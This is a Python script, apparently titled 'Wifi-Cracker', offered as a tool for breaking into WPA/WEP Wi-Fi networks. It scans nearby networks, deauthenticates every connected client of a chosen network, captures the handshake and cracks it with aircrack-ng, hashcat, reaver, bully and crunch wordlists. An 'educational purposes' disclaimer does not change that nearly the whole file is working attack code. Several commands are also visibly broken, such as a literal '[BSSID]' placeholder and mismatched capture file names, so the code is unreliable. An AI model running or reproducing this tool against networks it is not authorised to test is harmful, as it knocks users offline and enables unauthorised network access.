import os
import subprocess
import time
import logging
import signal
from colorama import Fore, Style, init
from tqdm import tqdm
from manuf import manuf  # You need to install this library for manufacturer lookup

init(autoreset=True)

logging.basicConfig(filename='wifi_cracker.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

print(Fore.YELLOW + "Caution: This tool is intended for educational purposes only. Unauthorized use may violate "
    "applicable law. Use responsibly and respect privacy.")

license_text = """
{green}MIT License

Copyright (c) 2024 by Eudes Charles

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
""".format(green=Fore.GREEN)

print(license_text)

read_license = input("Have you read the license? ({green}yes{reset}/{red}no{reset}): ".format(green=Fore.GREEN, red=Fore.RED, reset=Style.RESET_ALL)).strip().lower()

while read_license != 'yes':
    print(license_text)
    read_license = input("Have you read the license now? ({green}yes{reset}/{red}no{reset}): ".format(green=Fore.GREEN, red=Fore.RED, reset=Style.RESET_ALL)).strip().lower()

understand_agree = input("Do you understand and agree with the license? ({green}yes{reset}/{red}no{reset}): ".format(green=Fore.GREEN, red=Fore.RED, reset=Style.RESET_ALL)).strip().lower()

if understand_agree != 'yes':
    print(Fore.RED + "You must agree to the license to use this tool. Exiting.")
    exit(1)

# Clear the terminal
os.system('cls' if os.name == 'nt' else 'clear')

def run_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    logging.info(f"Command: {command}\nOutput: {result.stdout}\nError: {result.stderr}")
    return result.stdout, result.stderr

def check_root():
    if os.geteuid() != 0:
        print(Fore.RED + "This script must be run as root.")
        logging.error("Please run the script as root.")
        exit(1)

def display_intro():
    intro = """
    ---------------------------------------------------------------------------------------
        ██╗    ██╗██╗███████╗██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
        ██║    ██║██║██╔════╝██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
        ██║ █╗ ██║██║█████╗  ██║█████╗██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
        ██║███╗██║██║██╔══╝  ██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
        ╚███╔███╔╝██║██║     ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
        ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═════╝╚═╝  ╚╝╚══════╝╚═╝  ╚═╝
                                                                        Coded By Eudes(v 1.0)
    ---------------------------------------------------------------------------------------
    """
    print(Fore.GREEN + intro)
    logging.info("Displayed intro.")
    time.sleep(3)  

def check_and_install_requirements():
    required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng', 'hashcat', 'crunch', 'cap2hccapx.bin', 'reaver', 'bettercap', 'bully']
    
    missing_tools = []
    
    for tool in required_tools:
        out, err = run_command(f"which {tool}")
        if not out.strip():
            missing_tools.append(tool)
    
    if missing_tools:
        print(Fore.YELLOW + "The following tools are missing and will be installed: " + ", ".join(missing_tools))
        for tool in tqdm(missing_tools, desc="Installing tools"):
            if tool in ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng']:
                run_command("apt-get update && apt-get install -y aircrack-ng")
            elif tool == 'hashcat':
                run_command("apt-get update && apt-get install -y hashcat")
            elif tool == 'crunch':
                run_command("apt-get update && apt-get install -y crunch")
            elif tool == 'cap2hccapx.bin':
                run_command("apt-get update && apt-get install -y hashcat-utils")
            elif tool == 'reaver':
                run_command("apt-get update && apt-get install -y reaver")
            elif tool == 'bettercap':
                run_command("apt-get update && apt-get install -y bettercap")
            elif tool == 'bully':
                run_command("apt-get update && apt-get install -y bully")
        
        print(Fore.GREEN + "All required tools are installed.")
    else:
        print(Fore.GREEN + "All required tools are already installed.")

def find_wordlists():
    wordlist_directories = [
        "/usr/share/wordlists/",
        "/path/to/custom/wordlists/",  # Add custom wordlist directories
    ]
    
    wordlists = []
    for directory in wordlist_directories:
        if os.path.isdir(directory):
            files = os.listdir(directory)
            wordlists.extend([os.path.join(directory, file) for file in files if file.endswith('.txt')])
    
    return wordlists

def find_tools_with_wordlists():
    tools_with_wordlists = {
        "hashcat": ["rockyou.txt", "passwords.txt"],  # Example: Hashcat comes with RockYou and other wordlists
        "john": ["english.txt", "common.txt"],  # Example: John the Ripper comes with English and common wordlists
        # Add other tools and their associated wordlists
    }
    
    return tools_with_wordlists

def enable_monitor_mode():
    print(Fore.YELLOW + "Enabling monitor mode...")
    out, err = run_command("sudo airmon-ng start wlan0")
    if "monitor mode enabled" in out:
        print(Fore.GREEN + "Monitor mode enabled.")
        return True
    else:
        print(Fore.RED + "Failed to enable monitor mode.")
        logging.error("Failed to enable monitor mode.")
        return False

def signal_handler(sig, frame):
    print(Fore.GREEN + "\nScan stopped. Proceeding to network selection...")
    global scanning
    scanning = False

signal.signal(signal.SIGINT, signal_handler)

def scan_networks():
    print(Fore.YELLOW + "Scanning for networks... Press Ctrl+C to stop the scan.")
    global scanning
    scanning = True
    run_command("airodump-ng wlan0mon > networks.csv")
    while scanning:
        time.sleep(1)
    run_command("killall airodump-ng")
    return "networks.csv"

def get_manufacturer(bssid):
    parser = manuf.MacParser()
    return parser.get_manuf(bssid) or "Unknown"

def get_users(bssid):
    output, _ = run_command(f"airodump-ng --bssid {bssid} wlan0mon --write users --output-format csv")
    users = []
    with open('users-01.csv', 'r') as file:
        for line in file:
            if bssid in line:
                parts = line.split(',')
                if len(parts) > 0:
                    users.append(parts[0].strip())
    return users

def display_networks(result_file):
    networks = []
    with open(result_file, 'r') as file:
        for line in file:
            if 'WPA' in line or 'WEP' in line:
                parts = line.split(',')
                bssid = parts[0].strip()
                network = {
                    'number': len(networks) + 1,
                    'bssid': bssid,
                    'channel': parts[3].strip(),
                    'encryption': parts[5].strip(),
                    'power': parts[8].strip(),
                    'essid': parts[13].strip(),
                    'wps': 'Yes' if 'WPS' in parts else 'No',
                    'manufacturer': get_manufacturer(bssid),
                    'users': get_users(bssid)
                }
                networks.append(network)
    for network in networks:
        print(Fore.CYAN + f"{network['number']}. BSSID: {network['bssid']}, Channel: {network['channel']}, "
              f"Encryption: {network['encryption']}, Power: {network['power']}, ESSID: {network['essid']}, "
              f"WPS: {network['wps']}, Manufacturer: {network['manufacturer']}, Users: {len(network['users'])}")
    return networks

def deauth_users(bssid, channel):
    print(Fore.YELLOW + f"Deauthenticating users from BSSID {bssid} on channel {channel}...")
    run_command(f"airodump-ng --bssid {bssid} --channel {channel} --write users_deauth --output-format csv wlan0mon")
    users = get_users(bssid)
    for user in users:
        run_command(f"aireplay-ng --deauth 1 -a {bssid} -c {user} wlan0mon")
        print(Fore.GREEN + f"{user} has been deauthenticated from the network.")

def check_handshake():
    print(Fore.YELLOW + "Checking for handshake...")
    run_command("aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] capture.cap")
    return os.path.isfile("handshake-01.cap")

def crack_handshake_with_tool(hccapx_file, wordlist, tool):
    if tool == "aircrack-ng":
        print(Fore.YELLOW + f"Cracking handshake with aircrack-ng using wordlist {wordlist}...")
        out, err = run_command(f"aircrack-ng -w {wordlist} -b {hccapx_file}")
    elif tool == "reaver":
        print(Fore.YELLOW + f"Cracking handshake with Reaver...")
        out, err = run_command(f"reaver -i wlan0mon -b {hccapx_file} -vv")
    elif tool == "bettercap":
        print(Fore.YELLOW + f"Cracking handshake with Bettercap...")
        out, err = run_command(f"bettercap -eval 'wifi.recon on; wifi.assoc -b {hccapx_file}'")
    elif tool == "bully":
        print(Fore.YELLOW + f"Cracking handshake with Bully...")
        out, err = run_command(f"bully -b {hccapx_file} -c 6 -v 3 -F")
    elif tool == "hashcat":
        print(Fore.YELLOW + f"Cracking handshake with Hashcat using wordlist {wordlist}...")
        out, err = run_command(f"hashcat -m 2500 {hccapx_file} {wordlist} --force")
    
    if "Cracked" in out or "Found" in out:
        print(Fore.GREEN + "Password found!")
        print(out)
        logging.info(f"Password found with {tool} and wordlist {wordlist}.")
        return True
    return False

def generate_passwords():
    crunch_command = "crunch 8 12 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*() -o generated_wordlist.txt"
    print(Fore.YELLOW + f"Generating passwords with command: {crunch_command}")
    run_command(crunch_command)

def convert_cap_to_hccapx(cap_file):
    hccapx_file = cap_file.replace('.cap', '.hccapx')
    run_command(f"cap2hccapx.bin {cap_file} {hccapx_file}")
    return hccapx_file

def main():
    check_root()
    
    display_intro()
    
    check_and_install_requirements()
    
    if not enable_monitor_mode():
        print(Fore.RED + "Warning: Monitor mode could not be enabled. Some features may not work properly.")

    result_file = scan_networks()
    networks = display_networks(result_file)
    
    network_number = int(input(Fore.CYAN + "Select a network by number: "))
    if network_number < 1 or network_number > len(networks):
        print(Fore.RED + "Invalid network number. Please try again.")
        logging.error("Invalid network number selected.")
        return
    
    selected_network = networks[network_number - 1]
    bssid = selected_network['bssid']
    channel = selected_network['channel']
    
    deauth_users(bssid, channel)
    
    if check_handshake():
        print(Fore.GREEN + "Handshake captured successfully.")
        logging.info("Handshake captured successfully.")
        
        hccapx_file = convert_cap_to_hccapx("handshake-01.cap")
        
        tools = ["aircrack-ng", "reaver", "bettercap", "bully", "hashcat"]
        wordlists = find_wordlists()
        
        if not wordlists:
            print(Fore.RED + "No wordlists found. Exiting.")
            logging.error("No wordlists found. Exiting.")
            return
        
        print(Fore.CYAN + "Select the tool you want to use for cracking:")
        for i, tool in enumerate(tools):
            print(Fore.CYAN + f"{i + 1}. {tool}")
        
        tool_number = int(input(Fore.CYAN + "Enter the tool number: "))
        if tool_number < 1 or tool_number > len(tools):
            print(Fore.RED + "Invalid tool number. Proceeding with default sequence.")
            logging.warning("Invalid tool number selected, proceeding with default sequence.")
            tool_number = 1

        selected_tool = tools[tool_number - 1]
        
        for wordlist in wordlists:
            if crack_handshake_with_tool(hccapx_file, wordlist, selected_tool):
                return
        
        for tool in tools[tool_number:]:
            if tool == "hashcat":
                generate_passwords()
                if crack_handshake_with_tool(hccapx_file, "generated_wordlist.txt", "hashcat"):
                    print(Fore.GREEN + "Password cracked with generated passwords.")
                    logging.info("Password cracked with generated passwords.")
                    return
            elif any(crack_handshake_with_tool(hccapx_file, wordlist, tool) for wordlist in wordlists):
                print(Fore.GREEN + "Password cracked with next available tool.")
                return
        
        print(Fore.RED + "Failed to crack the password with all available tools and wordlists.")
        logging.info("Failed to crack the password with all available tools and wordlists.")
    else:
        print(Fore.RED + "Failed to capture handshake.")
        logging.error("Failed to capture handshake.")
    
    print(Fore.YELLOW + "Exiting.")

if __name__ == "__main__":
    main()
